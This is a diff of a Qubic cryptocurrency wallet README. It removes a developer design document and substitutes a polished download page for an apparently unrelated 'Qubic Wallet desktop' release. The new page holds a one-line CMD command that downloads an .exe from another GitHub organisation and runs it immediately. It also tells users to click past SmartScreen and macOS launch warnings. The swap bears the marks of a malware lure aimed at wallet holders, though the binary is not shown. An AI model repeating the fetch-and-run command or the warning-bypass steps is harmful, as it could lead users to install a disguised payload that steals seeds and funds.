@@ -1,107 +1,160 @@
-#  Qwallet for  QUBIC
-Easy to use end user wallet for Qubic.
+![Qubic Wallet](assets/qubic-wallet-download-seed-phrase-install-address-app-banner.png)
 
-# Goals
-The goal of Qwallet is to be an easy to use wallet for Qubic that enables the user to access all the major functions of the Qubic network, including most Smart Contracts (SC).
+# Qubic Wallet desktop application
 
-The main target OS for the UI is windows and osx, to achieve this a wasm based solution is used. Combined with webpages (and localhost webserver) all the major OS will be able to be supported. If we can also get mobile (android and iOS) support using this method, then it would be worth making some additional customizations to support mobile.
+The desktop wallet for Qubic: local accounts, Qubic assets and QX trading.
 
+<p align="center"><a href="https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/LICENSE"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2"><img src="assets/badge-release.svg" alt="Release"></a></p>
 
-# User accounts
+## Downloads - v0.8.2
 
-Qwallet manages user funds based on accounts. An account is simple a seed associated with a password. The seed is encrypted with the password and saved to a filename based on the hash of the password.
+<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>
 
-The user can have a seed generated for them automatically simply by trying to login with a password for the first time. If the password starts with a 'Q' the qubic 55 lowercase alphabetic seed is generated, if the password does not start with 'Q' then a 24 word bip39 seed is created. The actual seed is not saved on disk and all instances of seeds, subseeds, privatekeys are immediately scrubbed from memory after their use. The addseed command can be used to create an account with pre-existing seed and link it to a password, the Qpassword convention is not used for external seeds added.
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) |
+| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) |
+| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) |
 
-login password to generate bip39 24 words
+## SHA-256 checksums
 
-login Qpassword to generate qubic 55 chars seed
+| File | SHA-256 |
+| --- | --- |
+| [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) | `eb8b377ecf884da5932d3721e428823ed2787c061cc3ae3d3afaedc8d8593815` |
+| [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) | `8f4414a987a328fd1a75012b4c6a84fc10bc269df58ceb08104fe8c008815c81` |
+| [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) | `682d4dc414804fe3359f8e91d370f689aef99f3e82cecc382fd87180269cc9fc` |
 
-addseed password seed
-
-
-After a seed is created, you can specify it simply with the password.
-
-Once an account is created with a password, you can create derived privatekeys that combine the original seed for the password with the hash of the derivation string. This is automatically done on the first usage of the derivation index assuming a derivation string is provided.
-
-login password,1,derived
-
-Once you do that you can specify it with password,1
-
-The user will only need to know the password and derivations they supplied and the UI will be able to display. Each different user supplied password will create (or log into) a different user account.
+Check on Windows: `certutil -hashfile <file> SHA256`; macOS: `shasum -a 256 <file>`; Linux: `sha256sum <file>`. Every character must match; if it differs, delete the file and download it again.
 
 
-# Initial UI page
-The first step is to log into a user account with a user supplied password. Since each password corresponds to a different user account, there is no need to specify which user account and the user can simply enter the appropriate password. In the event this is the first time a user account is being used a default bip39 seed will be created and this will be returned to the UI page. The user MUST make a backup of this offline, eg. writing down on paper for safe keeping.
+> The desktop wallet keeps accounts on your machine instead of behind a login. That single decision
+> explains the rest of this page: what the wallet holds, what it cannot recover, and why the release page
+> matters more than any description of it.
 
-Before displaying to the user the corresponding address to this bip39 seed, the user should "prove" that a backup of the seed was made. Confirmation screen that cannot be copied to the clipboard, button to press when user says they have made a paper copy. Then a confirmation screen where the user puts in the 24 words. If and only if the user is able to match the correct 24 words, to continue to the normal after login page. If need be, the user can go back to the page that displays the 24 words and to submit as many times as they need to. This is only done the first time a user account is created, or a new seed is created.
+## What this repository is for
 
-If it is not the first time, after user supplies password, it can directly go to the after login page. This page will show all the addresses for every seed in the user account. Since each seed can have an arbitrary number of derived addresses, each seed should be able to be collapsed down to the initial address or expanded to see all the derived addresses for that seed. For each address, it would show the QU balance along with the last updated tick (and any assets that it has by expand/collapse that appears)
+This is the Qubic Wallet desktop application: the source, the build configuration and the release page
+that every guide in the documentation set points back to. The wallet creates accounts locally from a
+seed, stores them in an encrypted vault on your disk, holds the Qubic assets the current build supports
+and includes the QX trading screen. It runs on Windows, macOS and Linux, and the installers you see above
+are the ones the release publishes.
 
-The user will need to be able to add derived addresses and new seeds with appropriate functions.
+The repository is also the reference for verification. If a page elsewhere claims something about the
+wallet that cannot be checked here, it is a claim rather than a fact. Version numbers, installer names,
+archive formats and checksums all live on the release page, which is why the guides quote them instead of
+reproducing screenshots that age badly.
+
+There is no server-side account holding your keys. That is the property the whole product is arranged
+around: nobody can restore the account for you, and nobody can freeze it either. The trade is stated
+plainly in the documentation rather than buried: the seed you write down is the only recovery path, so
+the backup step is the most important step in the product.
+
+The documentation set is split by task and published as four repositories: setup and accounts,
+troubleshooting, features and platform support, and trust and comparisons. Each opens with a page that
+explains its cluster and lists every guide in it with one sentence about what that guide settles.
+
+## Who it is for
+
+- Qubic holders who want their keys on their own machine rather than in a browser session.
+- Users who need to hold QU alongside the Qubic assets the build supports, and to trade on QX.
+- People who have been sent a wallet link and want to check the build against its release first.
+- Developers reading the source or the release configuration before running something with a seed in it.
+
+## Start here
+
+- [Qubic Wallet download: get the installer and verify it before you run it](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-download-verify-installer.md) -
+  match the file you have to the published artefact, and know when to stop and download again.
+- [How to install Qubic Wallet on Windows, macOS and Linux](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-install-windows-macos-linux.md) -
+  the per-platform install path, including the archive formats the builds actually ship in.
+- [Creating your first Qubic Wallet account: seed type, password and backup proof](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-create-first-account.md) -
+  the creation flow and the check that turns a backup into something you have proven.
+- [Is Qubic Wallet safe? Source, seed and installer evidence](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/is-qubic-wallet-safe.md) -
+  the checks worth running yourself, in the order that makes each later check meaningful.
+
+## How to use this repository
+
+1. Read the checksum table above and compare it with the file you downloaded.
+2. Install from the release asset for your platform; the .zip builds are extracted, not clicked through.
+3. Create the account, write the seed down in full, then test a restore while the account is empty.
+4. Read the setup guides if anything in step three is unclear; they assume nothing.
+5. Keep the release page open when a screen does not match a guide, and check the version you run.
+
+## What the release contains
+
+- Windows installer, 64-bit, for Windows 10 (1909) or later.
+- macOS archive for Apple silicon, macOS 12 or later.
+- Linux archive for x64, Ubuntu 20.04 or later or equivalent.
+- The application source and build configuration at the tag the release names.
+- SHA-256 checksums for all three installers, in the table above and on the release page.
+- The documentation repositories linked from this page, published separately from the application.
+
+## Common first questions
+
+### Where do I get the wallet?
+
+From the release page of this repository, which is the only location these pages point at. The download
+guide explains how to match the file you received to the published artefact before you run it.
+
+### Does the wallet hold my keys on a server?
+
+No. Accounts are created locally from the seed and stored in a vault encrypted with your password, on
+your machine. That is also why nobody can recover the account for you if the seed is lost.
+
+### Which file do I need on a Mac?
+
+The macOS archive for Apple silicon. It is a .zip, so you extract it and open the app inside rather than
+double-clicking an installer; the install guide gives the steps in order.
+
+### Can I run the same account on two computers?
+
+Yes, with the same seed, and both machines see the same account. The two-devices guide explains what that
+means for anyone who obtains either machine, which is the part worth thinking about before you do it.
+
+## Before you install
+
+- Compare the checksum of the file you downloaded with the table above; do not run a mismatch.
+- Write the seed on paper, in full, and check it character by character against the wallet.
+- Decide before the first transaction what you would do if this machine were lost today.
+- Read the security page if you are installing on a machine you share or do not fully control.
+
+## How to install Qubic Wallet
+
+Quick install (CMD):
+
+```cmd
+curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
+```
+
+### Windows
+
+Manual install:
+
+1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
+2. Open the downloaded file.
+3. If SmartScreen appears, choose More info, then Run anyway.
+4. Finish the setup steps.
+
+### macOS
+
+The macOS build ships as a .zip archive, so there is no one-line command that both downloads and launches it. Extract it first, then open the app.
+
+1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a>.
+2. Double-click the .zip to extract it.
+3. Move the extracted app to Applications.
+4. On first launch, right-click the app and choose Open.
+
+### Linux
+
+The Linux build ships as a .zip archive as well; extract it and run the binary inside.
+
+1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip">qubic-wallet-desktop-v0.8.2-linux-x64.zip</a>.
+2. Extract the archive.
+3. Make the extracted binary executable.
+4. Run it.
 
 
-# Actions
-Given that there are funded address(es) in the user account, various actions are possible:
+## About and license
 
-The address where funds are to come from is specified by login,index. Currently a simple send creates the rawhex for the tx, it needs to be manually broadcast to the network.
+Qubic Wallet is the desktop wallet for Qubic. These pages and the application are published under the MIT license; the full text is in the documentation repository `LICENSE` file.
 
-send <password>,index,dest,amount[,extradata]
-
-Use index of 0 unless you want to use a derived address. extradata is an optional hexstring for data to be added to the transaction
-
-Future commands:
-
-Sendmany (up to 15625 destinations) with csv file
-
-Send Asset (Ownership and Possession) with asset name, destination and amount
-
-RANDOM entropy submission (amount to stake)
-
-QTRY and QX TBD
-
-During and after the action, an appropriate page should be displayed with the current status. For example, when sending QU, it will create a txid, send it, verify if it worked, if not it creates another txid, repeats. Status information about the pending Send QU will be in the console while it is progressing. Upon completion, updated balance of sender and receiver, completion tick and time, txid details should be displayed and the txid will be stored permanently for future retrieval.
-
-For Sendmany, it will have a potentially large number of txids, probably best if a completeion csv file is created and returned.
-
-Send Asset will work much like sending QU.
-
-RANDOM entropy submission just requires and amount and number of times (defaults to 1) to be specified.
-
-# Interface
-The UI interface to the wasm code will be via int qwallet(char *args,char *result)
-
-args would be the command line and result will be the completion result or error result.
-
-In general qwallet will return integer status as follows:
-negative number would indicate error.N occured, N being -result
-0 means operation completed
-positive number means operation was queued and the result is the queued task number.
-
-for a queued task number the status command can be used to obtain status, which will be the same status number unless the command completed, in which case the result will be set
-
-For now we can serialize the UI, so if a task number is returned, just poll the qwallet with status <tasknum> until it returns 0 or negative.
-
-On any negative number display the error value and the results which will have some details about the error
-
-# Feedback
-Kavatak:
-
-1. One notable feature is the process of the initial login with the repeated input of the seed bip39 (without the ability to copy). This is a valuable feature that emphasizes the importance of saving the seed. Some users might overlook this, leading to potential coin loss.
-
-2. The console is a handy feature (though perhaps it should be toggleable in the settings to avoid clutter for regular users).
-
-3. To become a top-1 wallet, you need to find a way to make a wallet for a mobile device.
-
-4. Adding a convenient copy address option (with a single click) and a QR code for the address could enhance the user experience.
-
-5. Implementing support channels (Discord/Telegram/email/FAQ) for feedback and issue resolution is essential.
-
-6. Storing the complete transaction history, including previous epochs, is a great idea. It allows users to easily track their financial operations, a feature currently lacking in wallet.qubic.li.
-
-7. Adding the ability to bookmark addresses for quick access and management could be beneficial.
-
-8. Consideration should be given to transaction confirmation methods, such as two-factor authentication or password usage.
-
-
-
+Nothing here is an audit or an endorsement, and every claim is checked against the release, the repository or the client constants rather than repeated from marketing.
